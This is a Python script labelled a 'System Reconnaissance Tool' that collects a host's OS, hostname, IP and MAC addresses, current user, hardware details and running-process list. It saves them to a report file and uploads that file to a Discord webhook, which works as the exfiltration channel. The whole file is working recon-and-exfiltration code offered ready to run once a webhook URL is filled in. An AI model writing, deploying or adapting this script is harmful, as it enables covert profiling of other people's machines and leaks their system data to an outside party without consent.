import os
import platform
import socket
import getpass
from datetime import datetime
import psutil
import requests  # pip install requests

# Ensure reports folder exists
if not os.path.exists("reports"):
    os.mkdir("reports")

# Replace with your Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/----------"

# ========================== System Info ==========================
def get_os_info():
    return f"{platform.system()} {platform.release()}"

def get_hostname():
    return socket.gethostname()

def get_ip_address():
    try:
        return socket.gethostbyname(get_hostname())
    except Exception:
        return "Unavailable"

def get_current_user():
    return getpass.getuser()

def get_architecture():
    return platform.machine()

def get_current_directory():
    return os.getcwd()

def get_cpu_info():
    return f"{platform.processor()} ({psutil.cpu_count(logical=True)} cores)"

def get_memory_info():
    mem = psutil.virtual_memory()
    return f"{round(mem.total / (1024 ** 3), 2)} GB"

def get_network_interfaces():
    interfaces = {}
    for iface_name, iface_addrs in psutil.net_if_addrs().items():
        ips = [addr.address for addr in iface_addrs if addr.family == socket.AF_INET]
        macs = [addr.address for addr in iface_addrs if addr.family == psutil.AF_LINK]
        interfaces[iface_name] = {"IP": ips, "MAC": macs}
    return interfaces

def get_process_list():
    return [p.info["name"] for p in psutil.process_iter(attrs=["name"])]

# ========================== Collect Full Data ==========================
def collect_data():
    data = {
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "Operating System": get_os_info(),
        "Hostname": get_hostname(),
        "IP Address": get_ip_address(),
        "Current User": get_current_user(),
        "Architecture": get_architecture(),
        "CPU Info": get_cpu_info(),
        "Memory Info": get_memory_info(),
        "Current Directory": get_current_directory(),
        "Network Interfaces": get_network_interfaces(),
        "Running Processes": get_process_list()
    }
    return data

# ========================== Save & Send ==========================
def save_report_txt(data):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"reports/system_report_{timestamp}.txt"
    with open(filename, "w", encoding="utf-8") as file:
        file.write("===== System Reconnaissance Report =====\n\n")
        for key, value in data.items():
            file.write(f"{key}: {value}\n" if not isinstance(value, dict) else f"{key}: {value}\n")
    return filename

def send_to_discord(file_path):
    try:
        with open(file_path, "rb") as f:
            response = requests.post(
                DISCORD_WEBHOOK_URL,
                files={"file": (os.path.basename(file_path), f, "text/plain")}
            )
        if response.status_code == 204:
            print("Report sent to Discord successfully!")
        else:
            print(f"Failed to send report. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending report to Discord: {e}")

# ========================== Main ==========================
def main():
    print("===== System Reconnaissance Tool (Non-Admin) =====")

    # Collect full report
    data = collect_data()

    # Display on console
    print("\n===== Full Recon Report =====")
    for key, value in data.items():
        print(f"{key}: {value}")
    print("==============================\n")

    # Save to file
    report_file = save_report_txt(data)
    print(f"Report saved as: {report_file}")

    # Send to Discord
    send_to_discord(report_file)

if __name__ == "__main__":
    main()
